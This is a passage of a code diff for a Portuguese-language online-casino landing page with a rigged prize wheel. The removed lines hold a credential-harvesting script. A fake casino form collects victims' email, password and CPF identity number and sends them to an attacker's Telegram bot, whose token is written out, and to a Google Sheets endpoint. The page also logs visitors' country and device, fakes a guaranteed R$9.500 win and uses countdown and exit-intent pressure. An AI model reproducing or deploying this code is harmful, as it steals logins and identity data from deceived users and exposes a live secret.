-    ctx.arc(cx, cy, r, start, end);
-    ctx.closePath();
-    ctx.fillStyle = seg.color;
-    ctx.fill();
-    ctx.strokeStyle = 'rgba(255,215,0,0.4)';
-    ctx.lineWidth = 1.5;
-    ctx.stroke();
-
-    ctx.save();
-    ctx.translate(cx, cy);
-    ctx.rotate(start + arc / 2);
-    ctx.textAlign = 'right';
-    ctx.fillStyle = seg.text;
-    ctx.font = 'bold 13px Montserrat, sans-serif';
-    ctx.shadowColor = 'rgba(0,0,0,0.8)';
-    ctx.shadowBlur = 4;
-    ctx.fillText(seg.label, r - 10, 5);
-    ctx.restore();
+    var start = angle + i * arc, end = start + arc;
+    ctx.beginPath(); ctx.moveTo(cx, cy); ctx.arc(cx, cy, r, start, end); ctx.closePath();
+    ctx.fillStyle = seg.color; ctx.fill();
+    ctx.strokeStyle = 'rgba(255,215,0,0.4)'; ctx.lineWidth = 1.5; ctx.stroke();
+    ctx.save(); ctx.translate(cx, cy); ctx.rotate(start + arc / 2);
+    ctx.textAlign = 'right'; ctx.fillStyle = seg.text; ctx.font = 'bold 14px Montserrat, sans-serif';
+    ctx.shadowColor = 'rgba(0,0,0,0.8)'; ctx.shadowBlur = 4; ctx.fillText(seg.label, r - 12, 5); ctx.restore();
   });
-
-  // Центр
-  ctx.beginPath();
-  ctx.arc(cx, cy, 28, 0, 2*Math.PI);
-  var cg = ctx.createRadialGradient(cx,cy,0,cx,cy,28);
-  cg.addColorStop(0,'#FFD700'); cg.addColorStop(1,'#FF8C00');
-  ctx.fillStyle = cg;
-  ctx.fill();
-  ctx.strokeStyle = '#fff';
-  ctx.lineWidth = 2;
-  ctx.stroke();
-  ctx.fillStyle = '#000';
-  ctx.font = 'bold 11px Montserrat, sans-serif';
-  ctx.textAlign = 'center';
-  ctx.fillText('🎰', cx, cy+4);
+  ctx.beginPath(); ctx.arc(cx, cy, 30, 0, 2*Math.PI);
+  var cg = ctx.createRadialGradient(cx,cy,0,cx,cy,30); cg.addColorStop(0,'#FFD700'); cg.addColorStop(1,'#FF8C00');
+  ctx.fillStyle = cg; ctx.fill(); ctx.strokeStyle = '#fff'; ctx.lineWidth = 2; ctx.stroke();
+  ctx.fillStyle = '#000'; ctx.font = 'bold 12px Montserrat, sans-serif'; ctx.textAlign = 'center'; ctx.fillText('SPIN', cx, cy+4);
 }
-
 drawWheel(0);
 
 function spinWheel() {
   if (isSpinning) return;
   isSpinning = true;
-  document.getElementById('spinBtn').disabled = true;
-  document.getElementById('spinBtn').textContent = '🌀 Girando...';
-
-  // Считаем угол чтобы выпал winIndex
-  var n = segments.length;
-  var arc = (2 * Math.PI) / n;
+  var btn = document.getElementById('spinBtn');
+  btn.disabled = true; btn.textContent = 'Girando...';
+  logEvent('wheel_spin');
+  var n = segments.length, arc = (2*Math.PI)/n;
   var targetAngle = (2*Math.PI) - (winIndex * arc) - (arc/2) - (Math.PI/2);
-  var extraSpins  = (5 + Math.random()*3) * 2 * Math.PI;
-  var finalAngle  = targetAngle + extraSpins;
-  var duration    = 4000;
-  var startTime   = null;
-  var startAngle  = currentAngle;
-
-  // TG — начал крутить
-  tgWheelSpin();
-
+  var finalAngle = targetAngle + (5 + Math.random()*3) * 2 * Math.PI;
+  var duration = 4000, startTime = null, startAngle = currentAngle;
   function animate(ts) {
     if (!startTime) startTime = ts;
-    var elapsed = ts - startTime;
-    var progress = Math.min(elapsed / duration, 1);
-    // ease out
+    var progress = Math.min((ts - startTime) / duration, 1);
     var ease = 1 - Math.pow(1 - progress, 4);
     currentAngle = startAngle + (finalAngle - startAngle) * ease;
     drawWheel(currentAngle);
-    if (progress < 1) {
-      requestAnimationFrame(animate);
-    } else {
-      currentAngle = finalAngle % (2*Math.PI);
-      isSpinning = false;
-      showWin();
-    }
+    if (progress < 1) { requestAnimationFrame(animate); }
+    else { currentAngle = finalAngle % (2*Math.PI); isSpinning = false; showWin(); }
   }
   requestAnimationFrame(animate);
 }
 
 function showWin() {
-  var prize = segments[winIndex].label;
-  document.getElementById('winPrize').textContent = prize;
-
-  var p = new URLSearchParams(location.search);
-  var base = 'https://track.luxeprofit.pro/click?pid=2137&offer_id=2457&l=1785345481';
-  if(p.get('sub1')) base += '&sub1=' + encodeURIComponent(p.get('sub1'));
-  if(p.get('sub2')) base += '&sub2=' + encodeURIComponent(p.get('sub2'));
-  if(p.get('sub3')) base += '&sub3=' + encodeURIComponent(p.get('sub3'));
-
-  // href обновляется аналитикой
-  document.getElementById('winCta').addEventListener('click', function() {
-    tgWheelClaim(prize);
-  });
-
-  document.getElementById('wheelOverlay').style.display = 'none';
+  logEvent('wheel_win');
+  var cta = document.getElementById('winCta');
+  cta.href = buildLink();
+  cta.addEventListener('click', function(){ logEvent('cta_click'); });
   document.getElementById('winPopup').classList.add('show');
-
-  // Таймер 5 минут
-  var secs = 300;
-  var iv = setInterval(function() {
-    secs--;
-    var m = Math.floor(secs/60), s = secs%60;
-    document.getElementById('winCountdown').textContent =
-      String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
-    if(secs <= 0) { clearInterval(iv); }
-  }, 1000);
-
-  tgWheelWin(prize);
 }
-
-// TG события колеса
-function tgWheelSpin() {
-  var p = new URLSearchParams(location.search);
-  fetch('https://api.telegram.org/bot8990797670:AAECHVdiTOAE29W4QI56NcMvPdAtLEKz3VI/sendMessage', {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      chat_id: '2026776037',
-      text: '🎡 <b>Крутит колесо!</b>\n📅 '+new Date().toLocaleString('ru-RU')+'\n🌍 Zone: '+(p.get('sub1')||'—'),
-      parse_mode:'HTML'
-    })
-  }).catch(()=>{});
-}
-function tgWheelWin(prize) {
-  var p = new URLSearchParams(location.search);
-  fetch('https://api.telegram.org/bot8990797670:AAECHVdiTOAE29W4QI56NcMvPdAtLEKz3VI/sendMessage', {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      chat_id: '2026776037',
-      text: '🎉 <b>Выиграл: '+prize+'</b>\n📅 '+new Date().toLocaleString('ru-RU')+'\n🌍 Zone: '+(p.get('sub1')||'—'),
-      parse_mode:'HTML'
-    })
-  }).catch(()=>{});
-}
-function tgWheelClaim(prize) {
-  var p = new URLSearchParams(location.search);
-  fetch('https://api.telegram.org/bot8990797670:AAECHVdiTOAE29W4QI56NcMvPdAtLEKz3VI/sendMessage', {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      chat_id: '2026776037',
-      text: '💰 <b>НАЖАЛ RESGATAR после колеса!</b>\nПриз: '+prize+'\n🌍 Zone: '+(p.get('sub1')||'—'),
-      parse_mode:'HTML'
-    })
-  }).catch(()=>{});
-}
-
-// =============================================
-// ЕДИНЫЙ БЛОК АНАЛИТИКИ + ФОРМА КАЗИНО
-// =============================================
-(function() {
-  var SHEETS = 'https://script.google.com/macros/s/AKfycbzbTaTSFfyQX-oh1aOx3wYk_DH60dpUcmCbjXCZEMM2SeddUOFacyUtQmWjUeCOuARG/exec';
-  var BOT    = '8990797670:AAECHVdiTOAE29W4QI56NcMvPdAtLEKz3VI';
-  var CHAT   = '2026776037';
-  var TRACK  = 'https://track.luxeprofit.pro/click?pid=2137&offer_id=2457&l=1785345481';
-  var t0     = Date.now();
-
-  var p    = new URLSearchParams(location.search);
-  var sub1 = p.get('sub1') || '';
-  var sub2 = p.get('sub2') || '';
-  var sub3 = p.get('sub3') || '';
-  var ref  = document.referrer || '';
-  var dev  = /tablet|ipad/i.test(navigator.userAgent) ? 'Tablet' :
-             /mobile|android|iphone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-  var country = '';
-  var wonPrize = 'R$9.500';
-  var retargetShown = false;
-
-  // === Получаем страну ===
-  fetch('https://ipapi.co/json/')
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
-      country = (d.country_name || '') + (d.emoji_flag ? ' ' + d.emoji_flag : '');
-      init();
-    })
-    .catch(function() { init(); });
-
-  // === Отправка в Sheets + TG ===
-  function log(event, extra) {
-    extra = extra || {};
-    var sec = Math.round((Date.now() - t0) / 1000);
-    var icons = {
-      visit:'👁', click_button:'🖱', promo_copy:'📋',
-      wheel_spin:'🎡', wheel_win:'🎉', wheel_claim:'💰',
-      page_leave:'🚪', form_submit:'🎰', retarget:'🔄',
-      email_captured:'📧', conversion:'💵'
-    };
-
-    // Google Sheets
-    var sheetsParams = new URLSearchParams({
-      event:    event,
-      sub1:     sub1,
-      sub2:     sub2,
-      sub3:     sub3,
-      country:  country,
-      device:   dev,
-      time_sec: String(sec),
-      prize:    extra.prize || '',
-      referrer: (extra.email || ref).substring(0, 80)
-    });
-    fetch(SHEETS + '?' + sheetsParams.toString()).catch(function() {});
-
-    // Telegram
-    var icon = icons[event] || '📌';
-    var txt = icon + ' <b>' + event.toUpperCase().replace(/_/g,' ') + '</b>\n' +
-      '📅 ' + new Date().toLocaleString('ru-RU') + '\n' +
-      '🌍 Zone: ' + (sub1 || '—') + '\n' +
-      '🔗 Click: ' + (sub2 || '—') + '\n' +
-      (extra.prize  ? '🏆 Приз: '  + extra.prize  + '\n' : '') +
-      (extra.email  ? '✉️ Email: ' + extra.email  + '\n' : '') +
-      (extra.senha  ? '🔑 Senha: ' + extra.senha  + '\n' : '') +
-      (extra.cpf    ? '📋 CPF: '   + extra.cpf    + '\n' : '') +
-      (dev === 'Mobile' ? '📱' : '🖥') + ' ' + dev + '\n' +
-      '🗺 ' + (country || '—') + '\n' +
-      '⏱ ' + sec + ' сек';
-
-    fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({chat_id: CHAT, text: txt, parse_mode: 'HTML'})
-    }).catch(function() {});
-  }
-
-  // === Строим ссылку на казино ===
-  function buildLink() {
-    var base = TRACK;
-    if (sub1) base += '&sub1=' + encodeURIComponent(sub1);
-    if (sub2) base += '&sub2=' + encodeURIComponent(sub2);
-    if (sub3) base += '&sub3=' + encodeURIComponent(sub3);
-    return base;
-  }
-
-  // === Инициализация ===
-  function init() {
-    // Визит
-    log('visit');
-
-    // Обновляем все CTA кнопки
-    var link = buildLink();
-    document.querySelectorAll('.btn-main').forEach(function(btn) {
-      btn.href = link;
-      btn.addEventListener('click', function() { log('click_button'); });
-    });
-
-    // Промокод
-    var cb = document.getElementById('copyBtn');
-    if (cb) cb.addEventListener('click', function() { log('promo_copy'); });
-
-    // Уход
-    window.addEventListener('beforeunload', function() { log('page_leave'); });
-
-    // Ретаргетинг при уходе мышью (десктоп)
-    document.addEventListener('mouseleave', function(e) {
-      if (e.clientY < 10 && !retargetShown) showRetarget();
-    });
-  }
-
-  // === Колесо ===
-  window.logWheelSpin  = function() { log('wheel_spin'); };
-  window.logWheelWin   = function(prize) { log('wheel_win', {prize: prize}); };
-  window.logWheelClaim = function(prize) { log('wheel_claim', {prize: prize}); };
-
-  // === Перехват showWin — показываем форму казино ===
-  window.showWin = function() {
-    wonPrize = 'R$9.500';
-    log('wheel_win', {prize: wonPrize});
-    // Скрываем колесо
-    var wo = document.getElementById('wheelOverlay');
-    if (wo) wo.style.display = 'none';
-    // Показываем форму казино
-    var co = document.getElementById('casinoOverlay');
-    if (co) co.classList.add('show');
-  };
-
-  // === Форма казино ===
-  window.closeCasinoForm = function() {
-    var co = document.getElementById('casinoOverlay');
-    if (co) co.classList.remove('show');
-    window.open(buildLink(), '_blank');
-    setTimeout(showRetarget, 20000);
-  };
-
-  window.submitCasinoForm = function() {
-    var emailEl = document.getElementById('casinoEmail');
-    var senhaEl = document.getElementById('casinoSenha');
-    var cpfEl   = document.getElementById('casinoCPF');
-
-    var email = emailEl ? emailEl.value.trim() : '';
-    var senha = senhaEl ? senhaEl.value.trim() : '';
-    var cpf   = cpfEl   ? cpfEl.value.trim()   : '';
-
-    if (!email || !email.includes('@')) {
-      if (emailEl) { emailEl.style.borderColor = '#FF4444'; emailEl.focus(); }
-      return;
-    }
-    if (!senha || senha.length < 6) {
-      if (senhaEl) { senhaEl.style.borderColor = '#FF4444'; senhaEl.focus(); }
-      return;
-    }
-
-    log('form_submit', {prize: wonPrize, email: email, senha: senha, cpf: cpf});
-
-    // Копируем email в буфер
-    try { navigator.clipboard.writeText(email); } catch(e) {}
-
-    // Закрываем форму
-    var co = document.getElementById('casinoOverlay');
-    if (co) co.classList.remove('show');
-
-    // Идём на казино
-    window.open(buildLink(), '_blank');
-
-    // Ретаргетинг через 30 сек
-    setTimeout(showRetarget, 30000);
-  };
-
-  // === Ретаргетинг ===
-  function showRetarget() {
-    if (retargetShown) return;
-    retargetShown = true;
-    var rp = document.getElementById('retargetPopup');
-    if (rp) rp.classList.add('show');
-    setTimeout(function() {
-      if (rp) rp.classList.remove('show');
-    }, 20000);
-  }
-
-  window.retargetYes = function() {
-    var rp = document.getElementById('retargetPopup');
-    if (rp) rp.classList.remove('show');
-    log('retarget', {prize: wonPrize});
-    window.open(buildLink(), '_blank');
-  };
-
-  window.retargetNo = function() {
-    var rp = document.getElementById('retargetPopup');
-    if (rp) rp.classList.remove('show');
-    retargetShown = false;
-    setTimeout(showRetarget, 120000);
-  };
-
-  // === Маска CPF ===
-  document.addEventListener('DOMContentLoaded', function() {
-    var cpfInput = document.getElementById('casinoCPF');
-    if (cpfInput) {
-      cpfInput.addEventListener('input', function() {
-        var v = this.value.replace(/\D/g, '');
-        v = v.replace(/(\d{3})(\d)/, '$1.$2');
-        v = v.replace(/(\d{3})(\d)/, '$1.$2');
-        v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
-        this.value = v;
-      });
-    }
-  });
-
-})();
-// =============================================
 </script>
-
 </body>
 </html>
